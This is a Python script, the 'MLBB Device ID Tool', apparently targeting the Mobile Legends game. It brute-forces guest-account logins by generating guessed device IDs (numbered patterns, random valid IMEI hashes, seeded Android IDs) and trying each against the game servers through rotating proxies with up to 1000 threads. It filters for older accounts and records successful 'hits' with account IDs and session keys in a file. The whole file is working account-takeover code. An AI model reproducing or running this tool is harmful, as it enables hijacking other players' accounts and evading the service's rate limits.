#!/usr/bin/env python3
"""
MLBB Device ID Tool — memory-efficient version (generators, no full list in RAM).
"""

import sys, os, io, time, threading, datetime, hashlib, random, uuid, platform
from queue import Queue

if platform.system() == "Windows":
    import msvcrt
else:
    import select, termios, tty
    class msvcrt:
        @staticmethod
        def kbhit():
            r, _, _ = select.select([sys.stdin], [], [], 0)
            return bool(r)
        @staticmethod
        def getch():
            fd = sys.stdin.fileno()
            old = termios.tcgetattr(fd)
            try:
                tty.setcbreak(fd)
                return os.read(fd, 1)
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old)

try:
    from colorama import Fore, Style
except ImportError:
    Fore = Style = type('_', (), {'__getattr__': lambda s, n: ''})()

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', line_buffering=True)
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', line_buffering=True)

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from device_login import _try_login, GLOBAL_SERVERS, query_game_server, _parse_proxy, _make_socket, _proxy_connect

_BASEDIR = os.path.dirname(os.path.abspath(__file__))
_HIT_FILE = os.path.join(_BASEDIR, "hit.txt")
_PROGRESS_FILE = os.path.join(_BASEDIR, "progress.json")
_LOOP_CONFIG = os.path.join(_BASEDIR, ".gen_loop_config.json")

FILTER_MIN_YEAR = 2026
TIMEOUT = 2
BATCH_SIZE = 5000

ALL_ZERO_AID = '0000000000000000'
ALL_ZERO_UUID = '00000000-0000-0000-0000-000000000000'

KNOWN_IMEIS = [
    'cd9e459ea708a948d5c2f5a6ca8838cf',
    '00000000000000000000000000000000',
]

_MAP_IMEIS = []
_map_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'api', 'hehr-main', 'hehr-main', 'device_id_map.json')
if os.path.isfile(_map_path):
    try:
        import json
        with open(_map_path, 'r', encoding='utf-8') as f:
            _data = json.load(f)
        _MAP_IMEIS = list(set(v.split('_')[1] for v in _data.values() if v.startswith('and_')))
        print(f"  Loaded {len(_MAP_IMEIS)} IMEIs from device_id_map.json")
    except Exception as e:
        print(f"  (device_id_map.json load failed: {e})")

ALL_POOL_IMEIS = list(dict.fromkeys(KNOWN_IMEIS + _MAP_IMEIS))
DEFAULT_IMEI = 'cd9e459ea708a948d5c2f5a6ca8838cf'

SEEDS = [0x6ccadce0ecc34ebe, 0x6cdc094fd84dc37b, 0x6cde2a1b468b6ebc, 0x6ce6bdfe9d3d446c, 0x6cfbed4b10eea20f, 0x6d6d02ea51d2d851, 0x6d9ece1bea752a2f, 0x6da4d9e5df01ceba, 0x6dada3bb1b8ffac2, 0x6dae7dde7f6fb2da, 0x6dca6dcbafca5cd5, 0x6dd680a8da4faafe, 0x6ddbccbbbed126ad, 0x6dece9a9fbfeff5f, 0x6df55cd11d2ce4bb, 0x6dfdf15dfee3eaf4, 0x6e088b36eb327f22, 0x6e08f7eb5dfb34dc, 0x6e2868b4bfcb4d3e, 0x6e29a5aa2462c0ed, 0x6e33d4ef738e5ce4, 0x6e5b3b5dd3f41dc2, 0x6ea2cfde72f4d80a, 0x6ebed8b9c6d7dbfe, 0x6ec2df01b18743e0, 0x6ecbbe9cf84f5aca, 0x6ecf4baceccf7cd5, 0x6eddbffee4dc8fca, 0x6eeb88fe02ff11fa, 0x6ef463bfbcce84f7, 0x6ef6fabd6de6ef3c, 0x6ef9c0be702400bf, 0x6efa8feca02bbccc, 0x6efe1bbbacb3020c, 0x6efe38c924916fee, 0x6f0739cebbd3c921, 0x6f0fbcd165d209a9, 0x6f4b0eb6aebcd248, 0x6f8cbc3a1aa12dbb, 0x6fbddf538decfa8f, 0x6fbfeaaeb16343de, 0x6fdecb1d8da6aad3, 0x6feac3538e3debcc, 0x6ff4b8dcfead25e1, 0x6fff8774bf63ad5f, 0x70023a6e534bcf5c, 0x701c6ec37e3ca6c2, 0x7026b0bb8ebc16c0]


def gen_rand_aid():
    r = random.random()
    if r < 0.2:
        return f'{random.randint(0x6c00000000000000, 0x7200000000000000):016x}'
    elif r < 0.6:
        return f'{random.choice(SEEDS) + random.randint(-10000000, 10000000):016x}'
    return f'{random.choice(SEEDS) + random.randint(-1000000000, 1000000000):016x}'


def _gen_num_range(start_n, end_n, pattern):
    """Generator — yields device IDs one at a time, zero memory."""
    for n in range(start_n, end_n + 1):
        if pattern == '1':
            yield f'and_{n}'
        elif pattern == '2':
            yield f'and_{n}_{n}'
        elif pattern == '3':
            yield f'and_0_0_{n}'
        elif pattern == '4':
            yield f'{n}'
        elif pattern == '5':
            yield f'ios_{n}'


def gen_real_device(id_imei_md5, aid=None, adv=None):
    """Assemble a device ID exactly like MLBB's real format:
       and_<md5(imei)>_<android_id>_<uuid>"""
    return f'and_{id_imei_md5}_{aid if aid else gen_rand_aid()}_{adv if adv else uuid.uuid4()}'


def _gen_default_imei(count):
    """Generator — random default IMEI devices (proper MLBB format)."""
    for _ in range(count):
        yield gen_real_device(DEFAULT_IMEI)


def _luhn_check_digit(num_str):
    total = 0
    for i, d in enumerate(reversed(num_str)):
        digit = int(d)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return (10 - (total % 10)) % 10


def _gen_guest_imei(count):
    seed = random.randint(1000000, 9999999)
    yielded = 0
    n = seed
    while yielded < count:
        imei_str = f'{n:015d}'
        n += 1
        if _luhn_check_digit(imei_str[:-1] if False else imei_str) != int(imei_str[-1]):
            continue
        md5 = hashlib.md5(imei_str.encode()).hexdigest()
        if yielded < len(ALL_POOL_IMEIS):
            yield gen_real_device(ALL_POOL_IMEIS[yielded])
        else:
            yield gen_real_device(md5)
        yielded += 1


def _gen_random_imei(count):
    """Generator — fully random valid IMEIs (like miniwebtool) as short and_<md5(imei)> IDs."""
    yielded = 0
    while yielded < count:
        tac = random.choice([
            '35', '86', '01', '91', '99', '45', '49', '54', '55', '56',
            '86', '87', '89', '90', '93', '98', '35', '33', '44', '60',
        ]) + f'{random.randint(0, 999999):06d}'
        serial = f'{random.randint(0, 999999):06d}'
        base = tac + serial
        imei = base + str(_luhn_check_digit(base))
        md5 = hashlib.md5(imei.encode()).hexdigest()
        yield f'and_{md5}'
        yielded += 1


def test_proxy(proxy_dict):
    try:
        s = _make_socket(None)
        s.settimeout(5)
        _proxy_connect(s, GLOBAL_SERVERS[0][0], GLOBAL_SERVERS[0][1], proxy_dict)
        s.close()
        return True
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return False


def check(did, proxy=None):
    for host, port in GLOBAL_SERVERS:
        r = _try_login(did, host, port, TIMEOUT, proxy=proxy)
        if r is None:
            continue
        err = r.get('_error')
        if err:
            return None, f'err{err}'
        perr = r.get('_proxy_error')
        if perr:
            return None, perr
        acc = r.get('account_id', '')
        if not acc:
            return None, 'no_acc'
        yr = None
        ts = r.get('creation_ts', 0)
        if ts:
            if ts > 1e12:
                ts /= 1000
            try:
                yr = datetime.datetime.fromtimestamp(ts).year
            except Exception:
                pass
        if yr and yr >= FILTER_MIN_YEAR:
            return None, 'too_new'
        gs = query_game_server(acc, r.get('session_key', ''), r.get('zone_id', 0), timeout=2)
        if gs:
            return r, 'hit'
        return r, 'dead'
    return None, 'no_resp'


def run():
    from tqdm import tqdm

    print(f"\n  {'=' * 52}")
    print(f"  MLBB Device ID Tool")
    print(f"  {'=' * 52}\n")

    mode = 'check'
    if not (_LOOP_MODE and os.path.isfile(_LOOP_CONFIG)):
        mode = (input("  Mode (generate/check) [check]: ").strip() or 'check').lower()

    if mode == 'generate':
        use_num = input("  Use numbered device IDs (and_1, and_2, ...)? (y/n) [n]: ").strip().lower() or 'n'
        if use_num == 'y':
            print(f"  ── Patterns ──")
            print(f"  [1] and_<N>           (simple number)")
            print(f"  [2] and_<N>_<N>        (two numbers)")
            print(f"  [3] and_0_0_<uuid(N)>  (real format with number UUID)")
            print(f"  [4] <N>               (raw number, no prefix)")
            print(f"  [5] ios_<N>           (iOS prefix)")
            p = input("  Pattern [1]: ").strip() or '1'
            rng = input("  Number (single or range like 30000000-50000000) [1]: ").strip()
            if not rng:
                start_n = end_n = 1
            elif '-' in rng:
                parts = rng.split('-', 1)
                start_n = int(parts[0].strip())
                end_n = int(parts[1].strip())
            else:
                start_n = end_n = int(rng.strip())
            count = end_n - start_n + 1
            print(f"  Range: {start_n}-{end_n} ({count} device IDs)")
            out = input("  Save to file? (blank = print): ").strip()
            if out:
                with open(out, 'w', encoding='utf-8') as f:
                    for did in _gen_num_range(start_n, end_n, p):
                        f.write(did + '\n')
                print(f"  Saved {count} device IDs to {out}")
            else:
                for i, did in enumerate(_gen_num_range(start_n, end_n, p)):
                    print(did)
                    if i >= 20:
                        print(f"  ... and {count - 20} more")
                        break
        else:
            count = int(input("  How many? [100]: ").strip() or "100")
            out = input("  Save to file? (blank = print): ").strip()
            if out:
                with open(out, 'w', encoding='utf-8') as f:
                    for did in _gen_default_imei(count):
                        f.write(did + '\n')
                print(f"  Saved {count} device IDs to {out}")
            else:
                for i, did in enumerate(_gen_default_imei(count)):
                    print(did)
                    if i >= 20:
                        print(f"  ... and {count - 20} more")
                        break
        return

    # ── Check mode ──
    proxy_list = []
    _loaded_config = False

    # Only auto-load config if there's unfinished progress to resume
    _has_progress = os.path.isfile(_PROGRESS_FILE)
    if _LOOP_MODE and _has_progress and os.path.isfile(_LOOP_CONFIG):
        try:
            import json as _json
            with open(_LOOP_CONFIG, 'r', encoding='utf-8') as f:
                cfg = _json.load(f)
            pf = cfg.get('proxy_file', '')
            use_num = cfg.get('use_num', 'n')
            p = cfg.get('pattern', '1')
            start_n = cfg.get('start_n', 1)
            end_n = cfg.get('end_n', 1)
            use_def = cfg.get('use_def', 'n')
            use_rand = cfg.get('use_rand', 'y')
            imei_count = cfg.get('imei_count', 100)
            threads = cfg.get('threads', 5)
            _loaded_config = True
            print(f"  Resuming with saved config (pattern={p} range={start_n}-{end_n} threads={threads})")
            if pf and os.path.isfile(pf):
                with open(pf, 'r', encoding='utf-8') as f:
                    raw = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                proxy_list = [proxy for r in raw if (proxy := _parse_proxy(r)) is not None]
                print(f"  Loaded {len(proxy_list)} proxies from {pf}")
        except Exception:
            _loaded_config = False

    if not _loaded_config:
        pf = input("  Proxy file (user:pass@host:port per line, blank=none)?: ").strip()
        if pf and os.path.isfile(pf):
            with open(pf, 'r', encoding='utf-8') as f:
                raw = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            proxy_list = [p2 for r in raw if (p2 := _parse_proxy(r)) is not None]
            print(f"  Loaded {len(proxy_list)} proxies from {pf}")

            check_p = input("  Check proxies first? (y/n) [y]: ").strip().lower() or 'y'
            if check_p == 'y' and proxy_list:
                good = [None] * len(proxy_list)
                lock = threading.Lock()

                def proxy_checker(pi):
                    ok = test_proxy(proxy_list[pi])
                    with lock:
                        good[pi] = ok

                with tqdm(total=len(proxy_list), desc="  Proxies", unit="p", ncols=80) as pbar:
                    def worker_wrapper(idx):
                        proxy_checker(idx)
                        pbar.update(1)

                    ts = [threading.Thread(target=worker_wrapper, args=(i,)) for i in range(len(proxy_list))]
                    for t in ts:
                        t.start()
                    for t in ts:
                        t.join()

                ok_count = sum(1 for g in good if g)
                print(f"    OK: {ok_count}/{len(proxy_list)}")
                proxy_list = [proxy_list[i] for i in range(len(proxy_list)) if good[i]]

    # ── Resume ──
    resume_mode = False
    resume_idx = 0
    progress = None
    if not _loaded_config:
        p = None
        use_def = 'n'
        use_num = 'n'
        use_rand = 'y'
        imei_count = 100

    if os.path.isfile(_PROGRESS_FILE):
        try:
            import json as _json
            with open(_PROGRESS_FILE, 'r', encoding='utf-8') as f:
                progress = _json.load(f)
            old_start = progress.get('start_n', 0)
            old_end = progress.get('end_n', 0)
            old_total = old_end - old_start + 1
            old_checked = progress.get('checked', 0)
            print(f"\n  {Fore.YELLOW}Saved progress found: {old_start}-{old_end} pattern={progress.get('pattern')} checked={old_checked}/{old_total}{Style.RESET_ALL}")
            if old_checked >= old_total:
                print(f"  {Fore.YELLOW}Progress already complete — starting fresh.{Style.RESET_ALL}")
                os.remove(_PROGRESS_FILE)
                progress = None
            else:
                resume = 'y' if _LOOP_MODE else input("  Resume? (y/n) [y]: ").strip().lower() or 'y'
                if resume == 'y':
                    resume_mode = True
                    resume_idx = old_checked
                    start_n = old_start
                    end_n = old_end
                    p = progress.get('pattern', '1')
                else:
                    os.remove(_PROGRESS_FILE)
                    progress = None
        except Exception:
            progress = None

    if not resume_mode and not _loaded_config:
        use_num = input("  Use numbered device IDs (and_1, and_2, ...)? (y/n) [n]: ").strip().lower() or 'n'
        if use_num == 'y':
            print(f"  ── Patterns ──")
            print(f"  [1] and_<N>           (simple number)")
            print(f"  [2] and_<N>_<N>        (two numbers)")
            print(f"  [3] and_0_0_<uuid(N)>  (real format with number UUID)")
            print(f"  [4] <N>               (raw number, no prefix)")
            print(f"  [5] ios_<N>           (iOS prefix)")
            p = input("  Pattern [1]: ").strip() or '1'
            rng = input("  Number (single or range like 30000000-50000000) [1]: ").strip()
            if not rng:
                start_n = end_n = 1
            elif '-' in rng:
                parts = rng.split('-', 1)
                start_n = int(parts[0].strip())
                end_n = int(parts[1].strip())
            else:
                start_n = end_n = int(rng.strip())
        else:
            use_def = input(f"  Use default IMEI ({DEFAULT_IMEI[:16]}...) only? (y/n) [n]: ").strip().lower() or 'n'
            if use_def == 'y':
                imei_count = int(input("  Devices to generate? [100]: ").strip() or "100")
            else:
                use_rand = input("  Use random valid IMEIs only? (y/n) [y]: ").strip().lower() or 'y'
                imei_count = int(input("  Random IMEIs to scan? [100]: ").strip() or "100")

    # Build generator + total count
    total_count = 0
    gen_start = 0
    if resume_mode or use_num == 'y':
        total_count = end_n - start_n + 1
        gen_start = (start_n + resume_idx) if resume_mode else start_n
        if resume_mode:
            total_count -= resume_idx
    elif use_def == 'y':
        total_count = imei_count
    else:
        total_count = imei_count

    threads = int(input("  Threads [5]: ").strip() or "5") if not _loaded_config else threads
    if threads > 1000:
        threads = 1000

    # Save config for loop restarts
    if _LOOP_MODE and not _loaded_config:
        try:
            import json as _json
            with open(_LOOP_CONFIG, 'w', encoding='utf-8') as f:
                _json.dump({
                    'proxy_file': pf,
                    'use_num': use_num,
                    'pattern': p,
                    'start_n': start_n if use_num == 'y' else 0,
                    'end_n': end_n if use_num == 'y' else 0,
'use_def': use_def,
                'use_rand': use_rand,
                'imei_count': imei_count,
                    'threads': threads,
                }, f, indent=2)
            print(f"  Config saved for auto-restart.")
        except Exception:
            pass

    if resume_mode:
        print(f"  Resumed from #{resume_idx}, {total_count} remaining")

    # ── Load existing hits for dedup ──
    seen_accounts = set()
    if os.path.isfile(_HIT_FILE):
        try:
            with open(_HIT_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('Account ID'):
                        aid = line.split(':', 1)[-1].strip()
                        if aid:
                            seen_accounts.add(aid)
        except Exception:
            pass

    # ── Run with bounded Queue (producer-consumer) ──
    work_q = Queue(maxsize=4096)
    done_sentinel = None
    save_lock = threading.Lock()
    hit_count = [0]
    dupe_count = [0]
    checked_count = [0]
    checked_lock = threading.Lock()
    t0 = time.time()
    stop_event = threading.Event()

    def save_hit(v):
        with save_lock:
            aid = v.get('account_id', '')
            if aid in seen_accounts:
                dupe_count[0] += 1
                return False
            seen_accounts.add(aid)
            hit_count[0] += 1
            with open(_HIT_FILE, 'a', encoding='utf-8') as f:
                f.write(f"\n===== HIT #{hit_count[0]} @ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} =====\n\n")
                f.write(f"  Device ID   : {v['device_id']}\n")
                f.write(f"  Account ID  : {v['account_id']}\n")
                f.write(f"  Zone ID     : {v['zone_id']}\n")
                f.write(f"  Server      : {v['server']}\n")
                f.write(f"  Session Key : {v['session_key'][:40]}...\n")
                f.write(f"  {'-' * 50}\n")
            return True

    def save_progress(checked):
        if p is not None:
            try:
                import json as _json
                with open(_PROGRESS_FILE, 'w', encoding='utf-8') as f:
                    _json.dump({'start_n': start_n, 'end_n': end_n, 'pattern': p, 'checked': checked, 'total': end_n - start_n + 1}, f)
            except Exception:
                pass

    def keyboard_listener():
        while not stop_event.is_set():
            if msvcrt.kbhit():
                ch = msvcrt.getch()
                if ch == b' ':
                    with checked_lock:
                        save_progress(checked_count[0])
                    print(f"\n  {Fore.YELLOW}Progress saved at #{checked_count[0]}. Press SPACE again to quit.{Style.RESET_ALL}")
            time.sleep(0.05)

    listener = threading.Thread(target=keyboard_listener, daemon=True)
    listener.start()

    # Producer — single thread, no thread-safety issue on generator
    def producer():
        if use_num == 'y':
            gen = _gen_num_range(gen_start, end_n, p)
        elif use_def == 'y':
            gen = _gen_default_imei(total_count)
        elif use_rand == 'y':
            gen = _gen_random_imei(total_count)
        else:
            gen = _gen_guest_imei(total_count)
        try:
            for did in gen:
                if stop_event.is_set():
                    break
                while not stop_event.is_set():
                    try:
                        work_q.put(did, block=True, timeout=5)
                        break
                    except Exception:
                        continue
        except Exception:
            pass
        finally:
            for _ in range(threads):
                work_q.put(done_sentinel)

    producer_t = threading.Thread(target=producer, daemon=True)
    producer_t.start()

    pbar = tqdm(total=total_count, desc="  Checking", unit="d", ncols=80,
                bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]')

    # Workers — each pulls from queue (thread-safe)
    _last_progress_save = [0]
    def worker():
        while True:
            try:
                did = work_q.get(block=True, timeout=2)
            except Exception:
                if stop_event.is_set():
                    return
                continue
            if did is done_sentinel:
                return
            proxy = random.choice(proxy_list) if proxy_list else None
            info, reason = check(did, proxy=proxy)
            with checked_lock:
                checked_count[0] += 1
                if p is not None and checked_count[0] - _last_progress_save[0] >= 5000:
                    save_progress(checked_count[0])
                    _last_progress_save[0] = checked_count[0]
            if info and reason == 'hit':
                saved = save_hit(info)
                if saved:
                    pbar.write(f"  HIT  acc={info['account_id']} zone={info['zone_id']}")
                else:
                    pbar.write(f"  DUP  acc={info['account_id']} (skipped)")
            pbar.update(1)

    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ts:
        t.start()
    try:
        producer_t.join()
        for t in ts:
            t.join()
    except KeyboardInterrupt:
        stop_event.set()
        pbar.close()
        if os.path.isfile(_PROGRESS_FILE):
            try: os.remove(_PROGRESS_FILE)
            except: pass
        print(f"\n  {Fore.YELLOW}Stopped — run again to start fresh.{Style.RESET_ALL}")
        return
    stop_event.set()
    pbar.close()
    elapsed = time.time() - t0

    if os.path.isfile(_PROGRESS_FILE):
        try:
            os.remove(_PROGRESS_FILE)
        except Exception:
            pass

    print(f"\n  {'=' * 52}")
    print(f"  Checked: {checked_count[0]} in {elapsed:.0f}s ({checked_count[0] / max(elapsed, 0.1):.0f}/s)")
    print(f"  HITS   : {hit_count[0]}  (new)")
    if dupe_count[0]:
        print(f"  DUPES  : {dupe_count[0]}  (skipped)")
    if proxy_list:
        print(f"  Proxies: {len(proxy_list)} working")
    print(f"  {'=' * 52}")

    if _LOOP_MODE:
        if use_num == 'y' and _loaded_config:
            rng_size = end_n - start_n + 1
            new_start = end_n + 1
            new_end = new_start + rng_size - 1
            cfg['start_n'] = new_start
            cfg['end_n'] = new_end
            try:
                import json as _json
                with open(_LOOP_CONFIG, 'w', encoding='utf-8') as f:
                    _json.dump(cfg, f, indent=2)
            except Exception:
                pass
            print(f"\n  Advancing to next range: {new_start}-{new_end}")
        print(f"  Restarting in 2s...")
        time.sleep(2)
    else:
        again = input(f"\n  Run again? (y/n) [n]: ").strip().lower()
        if again == 'y':
            run()


_LOOP_MODE = '--loop' in sys.argv or '--no-loop' not in sys.argv

if __name__ == '__main__':
    if '--no-loop' in sys.argv:
        run()
    else:
        _LOOP_MODE = True
        while True:
            try:
                run()
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"\n  Error: {e}, restarting in 3s...")
                time.sleep(3)
